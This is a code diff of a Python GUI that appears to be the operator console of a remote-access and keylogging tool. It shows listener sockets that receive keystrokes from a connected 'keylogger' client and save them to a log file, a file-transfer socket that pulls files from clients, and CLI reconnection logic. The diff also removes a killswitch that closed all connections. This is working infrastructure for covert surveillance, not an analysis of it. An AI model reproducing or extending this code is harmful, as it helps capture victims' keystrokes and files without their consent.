@@ -104,11 +104,11 @@ class App(customtkinter.CTk):
         self.button.grid(row=0, column=0, pady =10,padx =10,sticky="n")
 
         self.button = customtkinter.CTkButton(master=self.frame1, 
-                                            text="Killswitch",
+                                            text="PLACEHOLDER",
                                             bg_color="red", 
                                             fg_color="black",
                                             hover_color="red",
-                                            command=self.killswitch)
+                                            )
         self.button.grid(row=1, column=0, pady =10,sticky="n", padx=10)
 
         self.button = customtkinter.CTkButton(master=self.frame1, 
@@ -166,15 +166,16 @@ class App(customtkinter.CTk):
             t3 = threading.Thread(target=create_CLI_socket)
             t3.daemon = True
             t3.start()
-
+    
         def create_CLI_socket():
             global cli
             while True:
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as Ip_info: # This will get the Clients IP and Port so that the CLI can connect
-                        Ip_info.bind(("127.0.0.1", 44404))
-                        Ip_info.listen(1)
-                        conn, addr = Ip_info.accept()
-                        with conn:
+                # Recieve the clients IP PORT
+                while True:
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as Ip_info: # This will get the Clients IP and Port so that the CLI can connect
+                            Ip_info.bind(("127.0.0.1", 44404))
+                            Ip_info.listen(1)
+                            conn, addr = Ip_info.accept()
                             while True: 
                                 msg = conn.recv(128).decode("utf-8")
                                 if msg:
@@ -185,40 +186,45 @@ class App(customtkinter.CTk):
                                         time.sleep(0.5)
                                         conn.send(bytes("continue", 'utf-8'))
                                         break
-                                    except: print(f"Host: {HOST}\nPort: {PORT}")
-                        
-                break  
-            
-            while True:
-                try:    
-                    cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    cli.connect((HOST,PORT))
-                    print("CLI_Success: Connected to CLI client.")
-                    self.m_textbox.insert("0.0", f"\nCLI connection succesfull\n")  
-                    # Add the cli socket only once to the list
-                    if cli not in self.SERVER_SOCKETS:
-                        self.SERVER_SOCKETS.append(cli) 
-                    break
-                except Exception as e: print(f"Thrown Exception CLI: {e}")
-                time.sleep(3)
+                                    except: print(f"Host: {HOST}\nPort: {PORT}")     
+                    break  
 
-            #? Checks if the client is still connected
-            while True:
-                #print("Checking client status.")
-                try: cli.send(bytes("TEST DATA", "utf-8")) #? Send data to see if Client is online
-                except Exception as e: 
-                    if "[WinError 10056] A connect request was made on an already connected socket" in str(e): pass
-                    else: #? If not try to reconnect untill the client goes online
-                        try: 
-                            cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            cli.connect((HOST,PORT))
-                            print("CLI_Success: Reconnected with the client.")
-                            self.m_textbox.insert("0.0", f"\nClient to server connection re-established.\n") 
-                            if cli not in self.SERVER_SOCKETS: self.SERVER_SOCKETS.append(cli) 
-                        except: 
-                            self.m_textbox.insert("0.0", f"\nERROR: Client disconnected!\n") 
+                # Connect to the client
+                while True:
+                    try:    
+                        cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        cli.connect((HOST,PORT))
+                        print("CLI_Success: Connected to CLI client.")
+                        self.m_textbox.insert("0.0", f"\nCLI connection succesfull\n")  
+                        
+
+                        ###################################################################
+                        #! Start all the needed sockets once again as they have been closed
+                        ###################################################################
+
+                        
+                        
+                        if cli not in self.SERVER_SOCKETS:
+                            self.SERVER_SOCKETS.append(cli) 
+                        break
+                    except Exception as e: print(f"Thrown Exception CLI: {e}")
+                    time.sleep(3)
+
+                # Checks if the client is still connected
+                while True:
+                    try: 
+                        cli.send(bytes("TEST DATA", "utf-8")) 
+                        time.sleep(10)
+                    except Exception as e: 
+                        if "[WinError 10056] A connect request was made on an already connected socket" in str(e): pass
+                        else: 
+                            self.m_textbox.insert("0.0", f"\nERROR: Client has disconnected!\n") 
                             print(f"CLI Reconnection error: {e}")
-                time.sleep(3)
+                            ###############################################################
+                            #! After detecting a Client disconnect we MUST kill and renew ALL of our utility sockets like the keylogger otherwise the client wont be able to connect again
+                            ###############################################################
+                            break
+
         start_CLI_socket()    
 
         #? KEYLOGGER SOCKET
@@ -236,8 +242,8 @@ class App(customtkinter.CTk):
                 k_file.write(f"LOG: {str(datetime.now())}\n") # Insert the current time and date to the text file
                 while True:
                     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                        self.SERVER_SOCKETS.append(s)
                         # Continue
+                        print("waiting for keylogger connection")
                         s.bind((HOST, PORT))
                         s.listen()
                         conn, addr = s.accept()
@@ -253,11 +259,10 @@ class App(customtkinter.CTk):
                                     data = conn.recv(1024).decode("utf-8") 
                                     self.textbox.insert("0.0", f"{data}\n")
                                     k_file.write(f"{data}\n")
-                                except: 
-                                    print("\nKeylogger connection reset.\n"); 
-                                    k_file.close()
-                                    break 
-                                time.sleep(0.0001)
+                                except Exception as e:
+                                    print("\nKeylogger connection lost.\n"); 
+                                    time.sleep(2)
+                                    break
         startSocket()
         
         #? FILE_TRANSFER SOCKET
@@ -293,9 +298,6 @@ class App(customtkinter.CTk):
             t5.daemon = True
             t5.start()
             
-        ##########################################################################################################
-        # TODO: Rework the entire file transfer system, either in python without the conjoined header or in Rust #
-        ##########################################################################################################
         def create_file_transfer_socket():
             HOST = self.file_transfer_SOIP
             PORT = self.file_transfer_SOPORT
@@ -310,7 +312,6 @@ class App(customtkinter.CTk):
                     conn, addr = s.accept()
                     while True:
                         try:
-                            # Filesize is useless in this configuration the guy only used it for the graph
                             data = conn.recv(1024).decode("utf-8")
                             FILES = int(data)
                             conn.send("FILE_count_recv".encode("utf-8"))
@@ -339,36 +340,9 @@ class App(customtkinter.CTk):
                                 break
                         break
 
-                      
-         
         start_file_name_socket()
         start_file_transfer_socket()
 
-        #? GMS- General Message Socket
-        def startGeneralSocket():
-            t_gms = threading.Thread(target=createGeneralSocket)
-            t_gms.daemon = True
-            t_gms.start()
-
-        def createGeneralSocket():
-            HOST = self.genSoc_SOIP
-            PORT = self.genSoc_SOPORT 
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as gms_socket:
-                    self.SERVER_SOCKETS.append(gms_socket)
-                    self.m_textbox.insert("0.0", f"\nGMS client operational.\n") 
-                    while True:
-                        # Wait for client connection
-                        gms_socket.bind((HOST, PORT))
-                        gms_socket.listen()
-                        conn, addr = gms_socket.accept()
-                        with conn:
-                            self.CLIENT_IP.append(addr)
-                            self.m_textbox.insert("0.0", f"\nGMS client connected.\n")  
-                            while True:
-                                msg = conn.recv(128).decode("utf-8")
-                                if msg:
-                                    self.m_textbox.insert("0.0", f"\nGMS Client message recieved: {msg}\n")
-        startGeneralSocket()
                         
     ############################################################################################
     #                                        Functions                                         #
@@ -383,20 +357,6 @@ class App(customtkinter.CTk):
             
     def showFiles(self):
         subprocess.Popen('explorer "Files"')         
-    
-    def killswitch(self):
-        sockets_to_close = list(self.SERVER_SOCKETS) # Make a copy of the list to avoid changing it while iterating over it
-        for i in sockets_to_close:
-            print(type(i))
-        for soc in sockets_to_close:
-            try:
-                soc.shutdown(socket.SHUT_RDWR) # Shutdown both the read and write sides of the socket
-                soc.close()
-                print(f"Closing down socket: {soc}")
-            except OSError:
-                print(f"Error closing socket: {soc}")
-        self.SERVER_SOCKETS.clear() # Remove all sockets from the list
-        print("\n!!! KILLSWITCH: Successfully shutdown all connections. !!!\n")
     
     def openMapLevel(self):
         # create tkinter window
@@ -451,7 +411,6 @@ class App(customtkinter.CTk):
 def on_closing():
     if messagebox.askokcancel("Quit", "Do you want to quit?"):
         k_file.close()
-        app.killswitch()
         app.destroy()
 
 # Run dze up
